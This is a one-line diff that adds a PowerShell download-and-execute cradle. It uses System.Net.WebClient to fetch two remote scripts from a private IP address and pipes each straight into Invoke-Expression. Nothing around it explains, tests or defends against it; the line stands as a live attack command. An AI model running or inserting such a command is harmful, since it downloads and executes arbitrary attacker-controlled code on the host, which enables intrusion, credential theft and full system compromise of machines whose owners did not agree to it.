@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadString('http://192.168.49.123:80/pl/isma1.txt') | IEX ; (New-Object System.Net.WebClient).DownloadString('http://192.168.49.123:80/pl/run.txt') | IEX
